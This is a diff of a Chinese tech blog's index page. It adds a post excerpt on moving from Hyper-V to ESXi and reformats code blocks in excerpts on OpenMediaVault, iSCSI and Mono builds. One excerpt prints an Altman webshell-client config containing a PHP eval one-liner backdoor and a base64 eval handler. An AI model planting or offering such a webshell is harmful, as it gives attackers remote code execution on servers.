@@ -262,6 +262,137 @@
             
               
                 
+                <a class="post-title-link" href="/technology/moving-hyperv-to-esxi/" itemprop="url">
+                  从Hyper-V迁移到ESXI的血泪史
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">发表于</span>
+            <time itemprop="dateCreated" datetime="2016-06-03T00:00:00+08:00" content="2016-06-03">
+              2016-06-03
+            </time>
+          </span>
+
+          
+            <span class="post-category" >
+              &nbsp; | &nbsp;
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/technology/" itemprop="url" rel="index">
+                    <span itemprop="name">technology</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                &nbsp; | &nbsp;
+                <a href="/technology/moving-hyperv-to-esxi/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="technology/moving-hyperv-to-esxi/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          <h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>怎么说呢，在买Gen8之前就已经仔细比较过Hyper-V和ESXI的优劣，最终选择了Hyper-V的方案。</p>
+<p>当时决定选择Hyper-V平台有以下几个理由：</p>
+<ul>
+<li>Hyper-V提供的存储池使用方便，用起来简单</li>
+<li>Hyper-V相对于ESXI而言比较轻量，没有ESXI那么多臃肿的功能</li>
+<li>Hyper-V下可以实现硬盘休眠</li>
+<li>其实最主要的原因是，觉得自己的需求不大，哪个简单用哪个</li>
+</ul>
+<p>现在想来真是too young啊，我的需求怎么可能不大呢，Hyper-V自身的限制成了严重的短板。总之，在权衡未来需求和迁移成本之后，决定使用ESXI平台了。</p>
+<p>于是，我从一条不归路<strong>Server2012 With Hyper-V</strong>走向了另一条不归路<strong>ESXI6.0</strong>。</p>
+          <div class="post-more-link text-center">
+            <a class="btn" href="/technology/moving-hyperv-to-esxi/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
                 <a class="post-title-link" href="/howto/route-traffic-selectively-by-domain-on-openwrt/" itemprop="url">
                   Openwrt上使用dnsmasq和ipset实现域名分流
                 </a>
@@ -461,8 +592,8 @@
         
           <h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>之前买了个树莓派2，闲置了很久，最近正好有NAS需求，就打算拿它装个<code>OpenMediaVault</code>玩玩。<br>安装过程不表。</p>
 <p>事实上是在使用过程中，遇到的某个问题比较奇葩，就拿来分享了。</p>
-<h2 id="林尽水源"><a href="#林尽水源" class="headerlink" title="林尽水源"></a>林尽水源</h2><p>在网页端对OMV进行配置时，经常会遇到一个弹窗<code>monit: Cannot connect to the monit daemon. Did you start it with http support?</code>。<br>详细错误代码如下：<br><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">exception <span class="string">'OMVException'</span> <span class="keyword">with</span> <span class="keyword">message</span> <span class="string">'Failed to execute command '</span>export LANG=C; monit restart collectd <span class="number">2</span>&gt;&amp;<span class="number">1</span><span class="string">': monit: Cannot connect to the monit daemon. Did you start it with http support?'</span> <span class="keyword">in</span> /usr/share/php/openmediavault/monit.inc:<span class="number">113</span></span><br><span class="line">Stack trace:</span><br><span class="line"><span class="string">#0</span> /usr/share/php/openmediavault/monit.inc(<span class="number">70</span>): OMVMonit-&gt;action(<span class="string">'restart'</span>, <span class="string">'collectd'</span>, false)</span><br><span class="line"><span class="string">#1</span> /usr/share/openmediavault/engined/module/collectd.inc(<span class="number">53</span>): OMVMonit-&gt;restart(<span class="string">'collectd'</span>)</span><br><span class="line"><span class="string">#2</span> /usr/share/openmediavault/engined/rpc/config.inc(<span class="number">206</span>): OMVModuleCollectd-&gt;startService()</span><br><span class="line"><span class="string">#3</span> [internal <span class="function"><span class="keyword">function</span>]:</span> OMVRpcServiceConfig-&gt;applyChanges(<span class="keyword">Array</span>, <span class="keyword">Array</span>)</span><br><span class="line"><span class="string">#4</span> /usr/share/php/openmediavault/rpcservice.inc(<span class="number">125</span>): call_user_func_array(<span class="keyword">Array</span>, <span class="keyword">Array</span>)</span><br><span class="line"><span class="string">#5</span> /usr/share/php/openmediavault/rpcservice.inc(<span class="number">158</span>): OMVRpcServiceAbstract-&gt;callMethod(<span class="string">'applyChanges'</span>, <span class="keyword">Array</span>, <span class="keyword">Array</span>)</span><br><span class="line"><span class="string">#6</span> /usr/share/openmediavault/engined/rpc/config.inc(<span class="number">224</span>): OMVRpcServiceAbstract-&gt;callMethodBg(<span class="string">'applyChanges'</span>, <span class="keyword">Array</span>, <span class="keyword">Array</span>)</span><br><span class="line"><span class="string">#7</span> [internal <span class="function"><span class="keyword">function</span>]:</span> OMVRpcServiceConfig-&gt;applyChangesBg(<span class="keyword">Array</span>, <span class="keyword">Array</span>)</span><br><span class="line"><span class="string">#8</span> /usr/share/php/openmediavault/rpcservice.inc(<span class="number">125</span>): call_user_func_array(<span class="keyword">Array</span>, <span class="keyword">Array</span>)</span><br><span class="line"><span class="string">#9</span> /usr/share/php/openmediavault/rpc.inc(<span class="number">79</span>): OMVRpcServiceAbstract-&gt;callMethod(<span class="string">'applyChangesBg'</span>, <span class="keyword">Array</span>, <span class="keyword">Array</span>)</span><br><span class="line"><span class="string">#10</span> /usr/sbin/omv-engined(<span class="number">500</span>): OMVRpc::exec(<span class="string">'Config'</span>, <span class="string">'applyChangesBg'</span>, <span class="keyword">Array</span>, <span class="keyword">Array</span>, <span class="number">1</span>)</span><br><span class="line"><span class="string">#11</span> <span class="comment">&#123;main&#125;</span></span><br></pre></td></tr></table></figure></p>
-<p>ssh到<code>OMV</code>终端，输入命令：<code>monit status</code>，似乎错误信息也一样：<br><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">monit: <span class="keyword">error</span> connecting <span class="keyword">to</span> <span class="keyword">the</span> monit daemon</span><br></pre></td></tr></table></figure></p>
+<h2 id="林尽水源"><a href="#林尽水源" class="headerlink" title="林尽水源"></a>林尽水源</h2><p>在网页端对OMV进行配置时，经常会遇到一个弹窗<code>monit: Cannot connect to the monit daemon. Did you start it with http support?</code>。<br>详细错误代码如下：<br><figure class="highlight delphi"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">exception <span class="string">'OMVException'</span> <span class="keyword">with</span> <span class="keyword">message</span> <span class="string">'Failed to execute command '</span>export LANG=C; monit restart collectd <span class="number">2</span>&gt;&amp;<span class="number">1</span><span class="string">': monit: Cannot connect to the monit daemon. Did you start it with http support?'</span> <span class="keyword">in</span> /usr/share/php/openmediavault/monit.inc:<span class="number">113</span></div><div class="line">Stack trace:</div><div class="line"><span class="string">#0</span> /usr/share/php/openmediavault/monit.inc(<span class="number">70</span>): OMVMonit-&gt;action(<span class="string">'restart'</span>, <span class="string">'collectd'</span>, false)</div><div class="line"><span class="string">#1</span> /usr/share/openmediavault/engined/module/collectd.inc(<span class="number">53</span>): OMVMonit-&gt;restart(<span class="string">'collectd'</span>)</div><div class="line"><span class="string">#2</span> /usr/share/openmediavault/engined/rpc/config.inc(<span class="number">206</span>): OMVModuleCollectd-&gt;startService()</div><div class="line"><span class="string">#3</span> [internal <span class="function"><span class="keyword">function</span>]:</span> OMVRpcServiceConfig-&gt;applyChanges(<span class="keyword">Array</span>, <span class="keyword">Array</span>)</div><div class="line"><span class="string">#4</span> /usr/share/php/openmediavault/rpcservice.inc(<span class="number">125</span>): call_user_func_array(<span class="keyword">Array</span>, <span class="keyword">Array</span>)</div><div class="line"><span class="string">#5</span> /usr/share/php/openmediavault/rpcservice.inc(<span class="number">158</span>): OMVRpcServiceAbstract-&gt;callMethod(<span class="string">'applyChanges'</span>, <span class="keyword">Array</span>, <span class="keyword">Array</span>)</div><div class="line"><span class="string">#6</span> /usr/share/openmediavault/engined/rpc/config.inc(<span class="number">224</span>): OMVRpcServiceAbstract-&gt;callMethodBg(<span class="string">'applyChanges'</span>, <span class="keyword">Array</span>, <span class="keyword">Array</span>)</div><div class="line"><span class="string">#7</span> [internal <span class="function"><span class="keyword">function</span>]:</span> OMVRpcServiceConfig-&gt;applyChangesBg(<span class="keyword">Array</span>, <span class="keyword">Array</span>)</div><div class="line"><span class="string">#8</span> /usr/share/php/openmediavault/rpcservice.inc(<span class="number">125</span>): call_user_func_array(<span class="keyword">Array</span>, <span class="keyword">Array</span>)</div><div class="line"><span class="string">#9</span> /usr/share/php/openmediavault/rpc.inc(<span class="number">79</span>): OMVRpcServiceAbstract-&gt;callMethod(<span class="string">'applyChangesBg'</span>, <span class="keyword">Array</span>, <span class="keyword">Array</span>)</div><div class="line"><span class="string">#10</span> /usr/sbin/omv-engined(<span class="number">500</span>): OMVRpc::exec(<span class="string">'Config'</span>, <span class="string">'applyChangesBg'</span>, <span class="keyword">Array</span>, <span class="keyword">Array</span>, <span class="number">1</span>)</div><div class="line"><span class="string">#11</span> <span class="comment">&#123;main&#125;</span></div></pre></td></tr></table></figure></p>
+<p>ssh到<code>OMV</code>终端，输入命令：<code>monit status</code>，似乎错误信息也一样：<br><figure class="highlight applescript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">monit: <span class="keyword">error</span> connecting <span class="keyword">to</span> <span class="keyword">the</span> monit daemon</div></pre></td></tr></table></figure></p>
 <p>在这种情况下，<code>OMV</code>就无法应用配置，必须解决这问题。</p>
           <div class="post-more-link text-center">
             <a class="btn" href="/technology/error-connecting-to-the-monit-daemon-in-omv-for-pi2/#more" rel="contents">
@@ -588,10 +719,10 @@
           <p>因为有业务需求，需要在docker的容器下连接iscsi磁盘。</p>
 <ul>
 <li><p>部署docker镜像，安装<code>open-iscsi</code>：</p>
-<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">test<span class="variable">@testpc</span>$ docker pull <span class="attribute">ubuntu</span>:<span class="number">14.04</span></span><br><span class="line">test<span class="variable">@testpc</span>$ docker run <span class="attribute">ubuntu</span>:<span class="number">14.04</span> apt-get install -y open-iscsi</span><br></pre></td></tr></table></figure>
+<figure class="highlight less"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">test<span class="variable">@testpc</span>$ docker pull <span class="attribute">ubuntu</span>:<span class="number">14.04</span></div><div class="line">test<span class="variable">@testpc</span>$ docker run <span class="attribute">ubuntu</span>:<span class="number">14.04</span> apt-get install -y open-iscsi</div></pre></td></tr></table></figure>
 </li>
 <li><p>进入容器，运行<code>iscsiadm</code>：</p>
-<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root<span class="symbol">@aaaa</span><span class="meta"># iscsiadm -m discovery -t st -p 192.168.1.10</span></span><br><span class="line">iscsiadm: can <span class="literal">not</span> connect <span class="keyword">to</span> iSCSI daemon (<span class="number">111</span>)!</span><br><span class="line">iscsiadm: can <span class="literal">not</span> connect <span class="keyword">to</span> iSCSI daemon (<span class="number">111</span>)!</span><br><span class="line">iscsiadm: Cann perform discovery. connect <span class="keyword">to</span> iSCSI daemon (<span class="number">111</span>)!</span><br></pre></td></tr></table></figure>
+<figure class="highlight autoit"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">root<span class="symbol">@aaaa</span><span class="meta"># iscsiadm -m discovery -t st -p 192.168.1.10</span></div><div class="line">iscsiadm: can <span class="literal">not</span> connect <span class="keyword">to</span> iSCSI daemon (<span class="number">111</span>)!</div><div class="line">iscsiadm: can <span class="literal">not</span> connect <span class="keyword">to</span> iSCSI daemon (<span class="number">111</span>)!</div><div class="line">iscsiadm: Cann perform discovery. connect <span class="keyword">to</span> iSCSI daemon (<span class="number">111</span>)!</div></pre></td></tr></table></figure>
 </li>
 </ul>
           <div class="post-more-link text-center">
@@ -723,7 +854,7 @@
 <li>分区之后进行格式化</li>
 <li>设置开机自动加载分区</li>
 </ul>
-<h2 id="配置过程"><a href="#配置过程" class="headerlink" title="配置过程"></a>配置过程</h2><h3 id="安装程序open-iscsi"><a href="#安装程序open-iscsi" class="headerlink" title="安装程序open-iscsi"></a>安装程序<code>open-iscsi</code></h3><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">test<span class="variable">@ubuntu:</span>~$ apt-get install open-iscsi</span><br><span class="line">test<span class="variable">@ubuntu</span>:~$ service open-iscsi status</span><br></pre></td></tr></table></figure>
+<h2 id="配置过程"><a href="#配置过程" class="headerlink" title="配置过程"></a>配置过程</h2><h3 id="安装程序open-iscsi"><a href="#安装程序open-iscsi" class="headerlink" title="安装程序open-iscsi"></a>安装程序<code>open-iscsi</code></h3><figure class="highlight less"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">test<span class="variable">@ubuntu:</span>~$ apt-get install open-iscsi</div><div class="line">test<span class="variable">@ubuntu</span>:~$ service open-iscsi status</div></pre></td></tr></table></figure>
           <div class="post-more-link text-center">
             <a class="btn" href="/howto/howto-connect-iscsi-on-ubuntu/#more" rel="contents">
               阅读全文 &raquo;
@@ -1101,7 +1232,7 @@
         
           <p>之前测试altman工具的时候，遇到了一个问题，现解决方法如下：</p>
 <p>Altman连接phpEval一句话木马的时候，phpEval.type的定义如下：</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">customShellType</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">basicSetting</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>phpEval<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">serviceExample</span>&gt;</span>&lt;![CDATA[&lt;?php @eval($_POST[a])?&gt;]]&gt;<span class="tag">&lt;/<span class="name">serviceExample</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mainCodeParam</span> <span class="attr">location</span>=<span class="string">"Body"</span> <span class="attr">encrymode</span>=<span class="string">"None"</span> &gt;</span>passwd<span class="tag">&lt;/<span class="name">mainCodeParam</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">basicSetting</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">mainCodeSetting</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">funcCodeParam</span> <span class="attr">location</span>=<span class="string">"Body"</span> <span class="attr">encrymode</span>=<span class="string">"Base64"</span> &gt;</span>funcCode<span class="tag">&lt;/<span class="name">funcCodeParam</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">item</span>&gt;</span>&lt;![CDATA[print("-&gt;|");</span><br><span class="line">eval(base64_decode($_POST[$funcCode$]));</span><br><span class="line">print("|&lt;-");</span><br><span class="line">die();]]&gt;<span class="tag">&lt;/<span class="name">item</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">mainCodeSetting</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">customShellType</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">customShellType</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">basicSetting</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>phpEval<span class="tag">&lt;/<span class="name">name</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">serviceExample</span>&gt;</span>&lt;![CDATA[&lt;?php @eval($_POST[a])?&gt;]]&gt;<span class="tag">&lt;/<span class="name">serviceExample</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">mainCodeParam</span> <span class="attr">location</span>=<span class="string">"Body"</span> <span class="attr">encrymode</span>=<span class="string">"None"</span> &gt;</span>passwd<span class="tag">&lt;/<span class="name">mainCodeParam</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">basicSetting</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">mainCodeSetting</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">funcCodeParam</span> <span class="attr">location</span>=<span class="string">"Body"</span> <span class="attr">encrymode</span>=<span class="string">"Base64"</span> &gt;</span>funcCode<span class="tag">&lt;/<span class="name">funcCodeParam</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">item</span>&gt;</span>&lt;![CDATA[print("-&gt;|");</div><div class="line">eval(base64_decode($_POST[$funcCode$]));</div><div class="line">print("|&lt;-");</div><div class="line">die();]]&gt;<span class="tag">&lt;/<span class="name">item</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">mainCodeSetting</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">customShellType</span>&gt;</span></div></pre></td></tr></table></figure>
           <div class="post-more-link text-center">
             <a class="btn" href="/technology/altman-connects-phpEval-and-phpAssert-shell/#more" rel="contents">
               阅读全文 &raquo;
@@ -1350,132 +1481,9 @@
       
         
           <p>##0x00准备工作<br>一个全新安装的ubuntu13.10系统</p>
-<p>##0×01下载Mono源代码并编译<br><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">nike<span class="variable">@NIKE-PC:</span>~$ ls</span><br><span class="line">Desktop Downloads Music Public Videos</span><br><span class="line">Documents examples.desktop Pictures Templates</span><br><span class="line">nike<span class="variable">@NIKE-PC</span>:~$ mkdir src</span><br><span class="line">nike<span class="variable">@NIKE-PC</span>:~$ cd src</span><br><span class="line">nike<span class="variable">@NIKE-PC</span>:~/src$ wget <span class="attribute">http</span>:<span class="comment">//download.mono-project.com/sources/mono/mono-3.2.8.tar.bz2</span></span><br><span class="line">--<span class="number">2014</span>-<span class="number">03</span>-<span class="number">27</span> <span class="number">21</span>:<span class="number">24</span>:<span class="number">30</span>-- <span class="attribute">http</span>:<span class="comment">//download.mono-project.com/sources/mono/mono-3.2.8.tar.bz2</span></span><br><span class="line">Resolving download.mono-project.com (download.mono-project.com)... <span class="number">54.240</span>.<span class="number">168.102</span>, <span class="number">54.230</span>.<span class="number">156.158</span>, <span class="number">54.230</span>.<span class="number">157.116</span>, ...</span><br><span class="line">Connecting to download.mono-project.com (download.mono-project.com)|<span class="number">54.240</span>.<span class="number">168.102</span>|:<span class="number">80</span>... connected.</span><br><span class="line">HTTP request sent, awaiting response... <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Length</span>: <span class="number">77515552</span> (<span class="number">74</span>M) [application/x-bzip2]</span><br><span class="line">Saving <span class="attribute">to</span>: ‘mono-<span class="number">3.2</span>.<span class="number">8</span>.tar.bz2’</span><br><span class="line"></span><br><span class="line"><span class="number">100%</span>[======================================&gt;] <span class="number">77</span>,<span class="number">515</span>,<span class="number">552</span> <span class="number">189</span>K/s in <span class="number">10</span>m <span class="number">50s</span></span><br><span class="line"></span><br><span class="line">nike<span class="variable">@NIKE-PC</span>:~/src$ ls</span><br><span class="line">mono-<span class="number">3.2</span>.<span class="number">8</span>.tar.bz2</span><br><span class="line">nike<span class="variable">@NIKE-PC</span>:~/src$ tar -xjf mono-<span class="number">3.2</span>.<span class="number">8</span>.tar.bz2</span><br><span class="line">nike<span class="variable">@NIKE-PC</span>:~/src$ cd mono-<span class="number">3.2</span>.<span class="number">8</span>/</span><br><span class="line">nike<span class="variable">@NIKE-PC</span>:~/src/mono-<span class="number">3.2</span>.<span class="number">8</span>$ ./configure --prefix=/opt/mono-<span class="number">3.2</span>.<span class="number">8</span></span><br><span class="line">checking build system type... i686-pc-linux-gnu</span><br><span class="line">checking host system type... i686-pc-linux-gnu</span><br><span class="line">checking target system type... i686-pc-linux-gnu</span><br><span class="line">checking for a BSD-compatible install... /usr/bin/install -c</span><br><span class="line">checking whether build environment is sane... yes</span><br><span class="line">checking for a thread-safe mkdir -p... /bin/mkdir -p</span><br><span class="line">checking for gawk... no</span><br><span class="line">checking for mawk... mawk</span><br><span class="line">checking whether make sets $(MAKE)... yes</span><br><span class="line">checking how to create a ustar tar archive... gnutar</span><br><span class="line">checking whether to enable maintainer-specific portions of Makefiles... no</span><br><span class="line">checking whether ln -s works... yes</span><br><span class="line">checking whether make supports nested variables... yes</span><br><span class="line">checking host platform characteristics... ok</span><br><span class="line">checking for gcc... gcc</span><br><span class="line">checking for gcc... (cached) gcc</span><br><span class="line">checking whether the C compiler works... yes</span><br><span class="line">checking for C compiler default output file name... a.out</span><br><span class="line">checking for suffix of executables...</span><br><span class="line">checking whether we are cross compiling... no</span><br><span class="line">checking for suffix of object files... o</span><br><span class="line">checking whether we are using the GNU C compiler... yes</span><br><span class="line">checking whether gcc accepts -g... yes</span><br><span class="line">checking for gcc option to accept ISO C89... none needed</span><br><span class="line">checking for style of include used by make... GNU</span><br><span class="line">checking dependency style of gcc... gcc3</span><br><span class="line">checking for g++... no</span><br><span class="line">checking whether we are using the GNU C++ compiler... no</span><br><span class="line">checking whether g++ accepts -g... no</span><br><span class="line">checking dependency style of g++... none</span><br><span class="line">checking dependency style of gcc... gcc3</span><br><span class="line">checking for gawk... (cached) mawk</span><br><span class="line">checking whether gcc and cc understand -c and -o together... yes</span><br><span class="line"><span class="attribute">configure</span>: <span class="attribute">error</span>: You need to install g++</span><br></pre></td></tr></table></figure></p>
+<p>##0×01下载Mono源代码并编译<br><figure class="highlight less"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div></pre></td><td class="code"><pre><div class="line">nike<span class="variable">@NIKE-PC:</span>~$ ls</div><div class="line">Desktop Downloads Music Public Videos</div><div class="line">Documents examples.desktop Pictures Templates</div><div class="line">nike<span class="variable">@NIKE-PC</span>:~$ mkdir src</div><div class="line">nike<span class="variable">@NIKE-PC</span>:~$ cd src</div><div class="line">nike<span class="variable">@NIKE-PC</span>:~/src$ wget <span class="attribute">http</span>:<span class="comment">//download.mono-project.com/sources/mono/mono-3.2.8.tar.bz2</span></div><div class="line">--<span class="number">2014</span>-<span class="number">03</span>-<span class="number">27</span> <span class="number">21</span>:<span class="number">24</span>:<span class="number">30</span>-- <span class="attribute">http</span>:<span class="comment">//download.mono-project.com/sources/mono/mono-3.2.8.tar.bz2</span></div><div class="line">Resolving download.mono-project.com (download.mono-project.com)... <span class="number">54.240</span>.<span class="number">168.102</span>, <span class="number">54.230</span>.<span class="number">156.158</span>, <span class="number">54.230</span>.<span class="number">157.116</span>, ...</div><div class="line">Connecting to download.mono-project.com (download.mono-project.com)|<span class="number">54.240</span>.<span class="number">168.102</span>|:<span class="number">80</span>... connected.</div><div class="line">HTTP request sent, awaiting response... <span class="number">200</span> OK</div><div class="line"><span class="attribute">Length</span>: <span class="number">77515552</span> (<span class="number">74</span>M) [application/x-bzip2]</div><div class="line">Saving <span class="attribute">to</span>: ‘mono-<span class="number">3.2</span>.<span class="number">8</span>.tar.bz2’</div><div class="line"></div><div class="line"><span class="number">100%</span>[======================================&gt;] <span class="number">77</span>,<span class="number">515</span>,<span class="number">552</span> <span class="number">189</span>K/s in <span class="number">10</span>m <span class="number">50s</span></div><div class="line"></div><div class="line">nike<span class="variable">@NIKE-PC</span>:~/src$ ls</div><div class="line">mono-<span class="number">3.2</span>.<span class="number">8</span>.tar.bz2</div><div class="line">nike<span class="variable">@NIKE-PC</span>:~/src$ tar -xjf mono-<span class="number">3.2</span>.<span class="number">8</span>.tar.bz2</div><div class="line">nike<span class="variable">@NIKE-PC</span>:~/src$ cd mono-<span class="number">3.2</span>.<span class="number">8</span>/</div><div class="line">nike<span class="variable">@NIKE-PC</span>:~/src/mono-<span class="number">3.2</span>.<span class="number">8</span>$ ./configure --prefix=/opt/mono-<span class="number">3.2</span>.<span class="number">8</span></div><div class="line">checking build system type... i686-pc-linux-gnu</div><div class="line">checking host system type... i686-pc-linux-gnu</div><div class="line">checking target system type... i686-pc-linux-gnu</div><div class="line">checking for a BSD-compatible install... /usr/bin/install -c</div><div class="line">checking whether build environment is sane... yes</div><div class="line">checking for a thread-safe mkdir -p... /bin/mkdir -p</div><div class="line">checking for gawk... no</div><div class="line">checking for mawk... mawk</div><div class="line">checking whether make sets $(MAKE)... yes</div><div class="line">checking how to create a ustar tar archive... gnutar</div><div class="line">checking whether to enable maintainer-specific portions of Makefiles... no</div><div class="line">checking whether ln -s works... yes</div><div class="line">checking whether make supports nested variables... yes</div><div class="line">checking host platform characteristics... ok</div><div class="line">checking for gcc... gcc</div><div class="line">checking for gcc... (cached) gcc</div><div class="line">checking whether the C compiler works... yes</div><div class="line">checking for C compiler default output file name... a.out</div><div class="line">checking for suffix of executables...</div><div class="line">checking whether we are cross compiling... no</div><div class="line">checking for suffix of object files... o</div><div class="line">checking whether we are using the GNU C compiler... yes</div><div class="line">checking whether gcc accepts -g... yes</div><div class="line">checking for gcc option to accept ISO C89... none needed</div><div class="line">checking for style of include used by make... GNU</div><div class="line">checking dependency style of gcc... gcc3</div><div class="line">checking for g++... no</div><div class="line">checking whether we are using the GNU C++ compiler... no</div><div class="line">checking whether g++ accepts -g... no</div><div class="line">checking dependency style of g++... none</div><div class="line">checking dependency style of gcc... gcc3</div><div class="line">checking for gawk... (cached) mawk</div><div class="line">checking whether gcc and cc understand -c and -o together... yes</div><div class="line"><span class="attribute">configure</span>: <span class="attribute">error</span>: You need to install g++</div></pre></td></tr></table></figure></p>
